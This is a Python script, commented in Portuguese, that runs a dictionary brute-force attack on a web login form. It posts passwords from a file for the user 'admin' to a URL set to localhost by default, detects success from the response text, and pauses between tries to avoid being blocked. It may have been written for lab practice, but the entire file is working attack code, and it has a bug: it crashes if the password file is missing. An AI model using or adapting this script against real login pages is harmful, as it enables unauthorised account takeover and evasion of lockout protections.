import requests
import time

def brute_force_login(url, username, password_list):
    """
    Função que simula um ataque de força bruta em um formulário de login
    Parâmetros:
    - url: URL do formulário de login
    - username: Nome de usuário alvo
    - password_list: Lista de senhas para testar
    """
    
    # Contador de tentativas
    attempts = 0
    
    # Loop através de cada senha na lista
    for password in password_list:
        attempts += 1
        
        # Dados que serão enviados no formulário (simulando um POST)
        login_data = {
            'username': username,
            'password': password.strip()  # Remove espaços ou quebras de linha
        }
        
        print(f"Tentativa {attempts}: Testando senha '{password.strip()}'")
        
        try:
            # Faz a requisição POST ao site
            response = requests.post(url, data=login_data)
            
            # Verifica se o login foi bem-sucedido
            # (Aqui estamos assumindo que "Login failed" aparece no texto em caso de erro)
            if "Login failed" not in response.text:
                print(f"[+] Senha encontrada: {password.strip()}")
                print(f"[+] Tentativas necessárias: {attempts}")
                return password.strip()
            
            # Pequena pausa para simular comportamento real e evitar bloqueios
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"Erro na conexão: {e}")
            return None
    
    print("[-] Nenhuma senha foi encontrada na lista fornecida.")
    return None

# Exemplo de uso
if __name__ == "__main__":
    # URL fictícia de teste (substitua por uma URL de teste local se necessário)
    target_url = "http://127.0.0.1:5000/login"
    
    # Usuário alvo
    target_username = "admin"
    
    # Lista de senhas para testar (em um ataque real, seria muito maior)
    try: 
        with open("senhas.txt", "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"❌ Arquivo senhas.txt não encontrado!")

    print("Iniciando ataque de força bruta...")
    resultado = brute_force_login(target_url, target_username, passwords)